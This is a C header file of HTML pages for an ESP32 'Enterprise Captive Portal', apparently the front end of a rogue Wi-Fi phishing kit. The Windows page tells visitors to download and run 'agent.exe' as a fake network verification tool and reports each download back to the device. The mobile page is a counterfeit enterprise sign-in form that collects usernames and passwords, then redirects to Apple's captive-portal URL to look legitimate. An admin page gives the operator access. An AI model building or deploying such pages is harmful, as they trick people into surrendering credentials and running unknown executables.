/*
 * ============================================================================
 *  ESP32 Enterprise Captive Portal - HTML Pages
 *  Version: 2.0.0
 * ============================================================================
 */

#ifndef PAGES_H
#define PAGES_H

// ============================================================================
//  CSS Styles (Shared)
// ============================================================================
const char STYLES[] PROGMEM = R"rawliteral(
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:rgba(255,255,255,0.95);border-radius:20px;box-shadow:0 25px 50px rgba(0,0,0,0.3);padding:40px;max-width:420px;width:100%;backdrop-filter:blur(10px)}
.logo{width:80px;height:80px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);border-radius:20px;margin:0 auto 24px;display:flex;align-items:center;justify-content:center;box-shadow:0 10px 30px rgba(102,126,234,0.4)}
.logo svg{width:48px;height:48px;fill:white}
h1{color:#1a1a2e;font-size:24px;font-weight:700;text-align:center;margin-bottom:8px}
.subtitle{color:#666;text-align:center;margin-bottom:32px;font-size:14px}
.form-group{margin-bottom:20px}
.form-group label{display:block;color:#333;font-weight:600;margin-bottom:8px;font-size:14px}
.form-group input{width:100%;padding:14px 16px;border:2px solid #e1e5e9;border-radius:12px;font-size:16px;transition:all 0.3s}
.form-group input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 4px rgba(102,126,234,0.1)}
.btn{width:100%;padding:16px;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;margin-top:8px}
.btn-primary{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;box-shadow:0 8px 20px rgba(102,126,234,0.4)}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(102,126,234,0.5)}
.btn-download{background:linear-gradient(135deg,#11998e 0%,#38ef7d 100%);color:white;box-shadow:0 8px 20px rgba(17,153,142,0.4)}
.btn-download:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(17,153,142,0.5)}
.btn-danger{background:linear-gradient(135deg,#eb3349 0%,#f45c43 100%);color:white}
.info-box{background:#f0f4ff;border-radius:12px;padding:16px;margin-bottom:24px}
.info-box p{color:#4a5568;font-size:13px;line-height:1.6}
.info-box strong{color:#667eea}
.alert{padding:12px 16px;border-radius:8px;margin-bottom:16px;font-size:14px}
.alert-success{background:#d4edda;color:#155724;border:1px solid #c3e6cb}
.alert-error{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb}
.footer{text-align:center;margin-top:24px;color:#999;font-size:12px}
.spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
.hidden{display:none}
</style>
)rawliteral";

// ============================================================================
//  Windows Page
// ============================================================================
const char PAGE_WINDOWS[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Enterprise Network - Verification Required</title>
%STYLES%
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M3 12V6.75L9 5.43V11.91L3 12M20 3V11.75L10 11.9V5.21L20 3M3 13L9 13.09V19.9L3 18.75V13M20 13.25V22L10 20.09V13.1L20 13.25Z"/></svg></div>
<h1>Network Verification</h1>
<p class="subtitle">Windows device detected - verification required</p>
<div class="info-box">
<p>To complete your connection to <strong>Enterprise Network</strong>, please download and run the Network Verification Tool.</p>
</div>
<div id="status"></div>
<a href="/download/agent.exe" class="btn btn-download" id="downloadBtn" onclick="trackDownload()">
<span id="btnText">Download Verification Tool</span>
</a>
<p class="footer">Secure connection powered by Enterprise IT</p>
</div>
<script>
function trackDownload(){
document.getElementById('btnText').innerHTML='<span class="spinner"></span>Downloading...';
fetch('/api/download-notify').then(()=>{
setTimeout(()=>{document.getElementById('status').innerHTML='<div class="alert alert-success">Download started. Please run the file to complete verification.</div>';document.getElementById('btnText').textContent='Download Again';},1000);
});
}
</script>
</body>
</html>
)rawliteral";

// ============================================================================
//  Mobile Page (iPhone/Android)
// ============================================================================
const char PAGE_MOBILE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Enterprise Network - Sign In</title>
%STYLES%
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1M12 5A3 3 0 0 1 15 8A3 3 0 0 1 12 11A3 3 0 0 1 9 8A3 3 0 0 1 12 5M17.13 17C15.92 18.85 14.11 20.24 12 20.92C9.89 20.24 8.08 18.85 6.87 17C6.53 16.5 6.24 16 6 15.47C6 13.82 8.71 12.47 12 12.47S18 13.79 18 15.47C17.76 16 17.47 16.5 17.13 17Z"/></svg></div>
<h1>Enterprise Network</h1>
<p class="subtitle">Sign in to access the network</p>
<div id="status"></div>
<form id="loginForm" onsubmit="return submitForm(event)">
<div class="form-group">
<label for="username">Username or Email</label>
<input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
</div>
<button type="submit" class="btn btn-primary" id="submitBtn">
<span id="btnText">Sign In</span>
</button>
</form>
<p class="footer">Protected by Enterprise Security</p>
</div>
<script>
function submitForm(e){
e.preventDefault();
var btn=document.getElementById('submitBtn');
var btnText=document.getElementById('btnText');
btnText.innerHTML='<span class="spinner"></span>Authenticating...';
btn.disabled=true;
var data=new FormData(document.getElementById('loginForm'));
fetch('/api/login',{method:'POST',body:data}).then(r=>r.json()).then(d=>{
if(d.success){
document.getElementById('status').innerHTML='<div class="alert alert-success">Authentication successful! You are now connected.</div>';
btnText.textContent='Connected';
setTimeout(()=>{window.location.href='http://captive.apple.com/hotspot-detect.html';},2000);
}else{
document.getElementById('status').innerHTML='<div class="alert alert-error">'+d.message+'</div>';
btnText.textContent='Sign In';
btn.disabled=false;
}
}).catch(()=>{
document.getElementById('status').innerHTML='<div class="alert alert-error">Connection error. Please try again.</div>';
btnText.textContent='Sign In';
btn.disabled=false;
});
return false;
}
</script>
</body>
</html>
)rawliteral";

// ============================================================================
//  Admin Login Page
// ============================================================================
const char PAGE_ADMIN_LOGIN[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin Portal - Login</title>
%STYLES%
<style>.container{max-width:380px}</style>
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M11,7H13V9H11V7M11,11H13V17H11V11Z"/></svg></div>
<h1>Admin Portal</h1>
<p class="subtitle">Enter credentials to access dashboard</p>
<div id="status"></div>
<form id="adminForm" onsubmit="return adminLogin(event)">
<div class="form-group">
<label for="password">Admin Password</label>
<input type="password" id="password" name="password" placeholder="Enter admin password" required autofocus>
</div>
<button type="submit" class="btn btn-primary" id="submitBtn">Access Dashboard</button>
</form>
</div>
<script>
function adminLogin(e){
e.preventDefault();
var btn=document.getElementById('submitBtn');
btn.disabled=true;
btn.textContent='Verifying...';
var data=new FormData(document.getElementById('adminForm'));
fetch('/api/admin-auth',{method:'POST',body:data}).then(r=>r.json()).then(d=>{
if(d.success){window.location.reload();}
else{document.getElementById('status').innerHTML='<div class="alert alert-error">'+d.message+'</div>';btn.disabled=false;btn.textContent='Access Dashboard';}
}).catch(()=>{btn.disabled=false;btn.textContent='Access Dashboard';});
return false;
}
</script>
</body>
</html>
)rawliteral";

#endif
